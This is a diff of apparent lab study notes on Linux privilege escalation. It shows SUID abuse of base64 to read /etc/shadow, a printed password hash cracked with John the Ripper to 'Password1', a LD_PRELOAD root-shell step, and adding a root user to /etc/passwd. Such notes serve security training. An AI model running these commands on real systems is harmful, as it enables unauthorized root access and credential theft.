@@ -36,7 +36,7 @@
 * Systems can be identified by reading the `/etc/issue` file using `cat`.
 * Usually contains some information about the OS.
 
-### `ps` Command
+### `ps`
 * Effective way to see the running processes on a Linux system.
 * Shows processes for the current shell.
 * Output of the `ps` (Process Status).
@@ -79,7 +79,6 @@ cat /etc/passwd | cut -d ":" -f 1
 ```
 cat /etc/passwd | grep home
 ```
-
 ### `history`
 * Looking at earlier commands with the `history` command can give some idea about the target system.
 * Rarely has stored information such as passwords or usernames.
@@ -110,10 +109,10 @@ cat /etc/passwd | grep home
   * `-n`: Do not resolve names
   * `-o`: Display timers
 
-### `find` Command
+### `find`
 * Searching the target system for important information and potential privilege escalation vectors can be fruitful.
 
-| Command | Purpose
+| `Find` Parameters | Purpose
 | --- | ---
 | `find . -name flag1.txt` | Find the file named `flag1.txt` in the current directory.
 | `find /home -name flag1.txt` | Find the file names `flag1.txt` in the `/home` directory.
@@ -281,39 +280,100 @@ sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 5. This will result in a shell spawn with root privileges.
 
 ## Privilege Escalation: SUID
-* Much of Linux privilege controls relies on controlling permissions.
-  * Files can have read, write, and execute permissions.
-    * These are given to users within their privilege levels.
-    * This changes with SUID (Set-user Identification) and SGID (Set-group Identification).
-      * These allow files to be executed with the permission level of the file owner or the group owner.
-      * Files have an `s` bit set showing their special permission level.
+* Linux files can have read, write, and execute permissions.
+  * Given to users within their privilege levels.
+  * SUID (Set-user Identification) allow files to be executed with permission level of the file owner.
+  * SGID (Set-group Identification) allow files to be executed with permission level of the group owner.
+    * `s` bit set showing file's special permission level.
 * `find / -type f -perm -04000 -ls 2>/dev/null` lists files that have SUID or SGID bits set.
-  * Good practice would be to compare executables on this list with [GTFOBins](https://gtfobins.github.io).
+  * Compare executables on this list with [GTFOBins](https://gtfobins.github.io).
   * Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set.
-  * Use [this link](https://gtfobins.github.io/#+suid) for a pre-filtered list.
-    * List shows that `nano` has the SUID bit set but no easy wins.
-      * `Nano` SUID bit set allows creation, editing and reading of files using the file owner’s privilege.
-      * `Nano` is owned by root.
-         * Reading and editing of files at a higher privilege level than the current user is possible.
-         * Two basic options for privilege escalation.
-           * Reading the `/etc/shadow` file.
-           * Adding the user to `/etc/passwd`.
-
-## Reading the /etc/shadow file
-* `Nano` text editor has SUID bit set by running `find / -type f -perm -04000 -ls 2>/dev/null`.
-* `nano /etc/shadow` prints the contents of the `/etc/shadow` file.
-* Use the `unshadow` tool to create a file crackable by John the Ripper.
-* `unshadow` needs both the `/etc/shadow` and `/etc/passwd` files.
+  * Use [this link](https://gtfobins.github.io/#+suid) for pre-filtered list.
+    * List shows that `base64` has the SUID bit set.
 ```
-unshadow passwd.txt shadow.txt > passwords.txt
+1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
+```
+>SUID
+
+>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.
+
+>This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
+```
+LFILE=file_to_read
+./base64 "$LFILE" | base64 --decode
+```
+* `base64` SUID bit set does not drop the elevated privileges and may be abused to access the file system.
+  * `base64` is owned by root.
+  * Reading and editing of files at a higher privilege level than the current user is possible.
+* Two basic options for privilege escalation.
+  * Reading the `/etc/shadow` file.
+  * Adding the user to `/etc/passwd`.
+
+## Read /etc/shadow file
+* `find / -type f -perm -04000 -ls 2>/dev/null`.
+  * `base64` has SUID bit set.
+```
+$ LFILE=/etc/shadow
+$ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
+```
+* Prints contents of the `/etc/shadow` file.
+```
+```
+user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
+```
+```
+$ LFILE=/etc/passwd
+$ /usr/bin/base64 "$LFILE" | base64 --decode | grep user2
+```
+* Prints contents of the `/etc/passwd` file.
+```
+```
+user2:x:1002:1002::/home/user2:/bin/sh
+```
+* Create temporary 'SUID' folder on Desktop.
+```
+mkdir ./Desktop/SUID
+```
+* Create empty files in SUID folder.
+```
+touch ./Desktop/SUID/passwd.txt
+```
+  * Copy **user2** data from `/etc/passwd' into `passwd.txt` file.
+```
+```
+touch ./Desktop/SUID/passwords.txt
+```
+```
+touch ./Desktop/SUID/shadow.txt
+```
+  * Copy **user2** data from `/etc/shadow' into `shadow.txt` file.
+* `unshadow` tool creates a file crackable by John the Ripper.
+```
+unshadow ./Desktop/SUID/passwd.txt ./Desktop/SUID/shadow.txt > ./Desktop/SUID/passwords.txt
 ```
 * John the Ripper can return one or several passwords in cleartext with the correct wordlist and a little luck.
-* Another option would be to add a new user that has root privileges.
+```
+john --wordlist=/usr/share/wordlists/rockyou.txt ./Desktop/SUID/passwords.txt
+Warning: detected hash type "sha512crypt", but the string is also recognized as "HMAC-SHA256"
+Use the "--format=HMAC-SHA256" option to force loading these as that type instead
+Warning: detected hash type "sha512crypt", but the string is also recognized as "sha512crypt-opencl"
+Use the "--format=sha512crypt-opencl" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Password1        (user2)
+1g 0:00:00:06 DONE (2024-02-12 18:39) 0.1526g/s 547.1p/s 547.1c/s 547.1C/s asdf1234..fresa
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+* Another option would be to add a new user that has root privileges if the SUID bit was set for a text editor.
   * This would help circumvent the tedious process of password cracking.
   * Need the hash value of the password the new user should have.
     * This can be done quickly using `openssl`.
 ```
-openssl passwd -l -salt THM password1
+openssl passwd -1 -salt THM password1
 $1$THM$WnbwlliCqxFRQepUTCkUT1
 ```
 * Add the password with a username to the `/etc/passwd` file.
